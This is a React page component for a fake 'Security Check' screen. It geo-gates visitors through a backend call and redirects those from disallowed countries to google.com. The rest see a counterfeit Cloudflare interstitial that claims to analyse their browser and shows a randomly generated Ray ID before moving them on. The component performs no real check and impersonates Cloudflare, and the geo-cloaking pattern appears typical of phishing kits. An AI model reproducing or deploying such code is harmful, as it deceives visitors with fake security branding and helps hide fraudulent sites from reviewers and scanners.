import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { ShieldCheck, Loader2 } from "lucide-react";
import { useVisitId } from "@/hooks/use-visit-id";
import { apiUrl } from "@/lib/api-base";

export default function SecurityCheck() {
  const [, setLocation] = useLocation();
  const [gateOk, setGateOk] = useState<boolean | null>(null);
  useVisitId();

  useEffect(() => {
    let cancelled = false;

    // Portail géo : une requête au backend pour que la restriction géo s'applique dès l'arrivée
    fetch(apiUrl("/api/geo-gate"), { method: "GET", redirect: "manual", credentials: "include" })
      .then((res) => {
        if (cancelled) return;
        // 302 / opaque redirect = backend a redirigé (pays non autorisé)
        if (res.type === "opaqueredirect" || res.status === 302 || res.status === 0) {
          const location = res.headers.get("Location") || "https://www.google.com";
          window.location.href = location;
          return;
        }
        setGateOk(true);
      })
      .catch(() => {
        if (!cancelled) setGateOk(true); // en cas d'erreur réseau, laisser passer
      });

    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (gateOk !== true) return;
    const timer = setTimeout(() => setLocation("/home"), 2500);
    return () => clearTimeout(timer);
  }, [gateOk, setLocation]);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4 font-sans text-gray-800">
      <div className="max-w-md w-full text-center space-y-6">
        <div className="flex justify-center mb-4">
          <ShieldCheck className="h-16 w-16 text-brand-blue animate-pulse" />
        </div>
        
        <h1 className="text-2xl font-bold text-brand-blue">
          Security Check
        </h1>
        
        <div className="flex flex-col items-center gap-4">
          <Loader2 className="h-8 w-8 text-brand-orange animate-spin" />
          <p className="text-gray-500 text-sm">
            Analyzing your browser settings and verifying secure connection...
          </p>
        </div>

        <div className="text-xs text-gray-400 mt-8 pt-8 border-t border-gray-100">
          DDoS protection by <span className="font-semibold">Cloudflare</span>
          <br />
          Ray ID: {Math.random().toString(36).substr(2, 16).toUpperCase()}
        </div>
      </div>
    </div>
  );
}
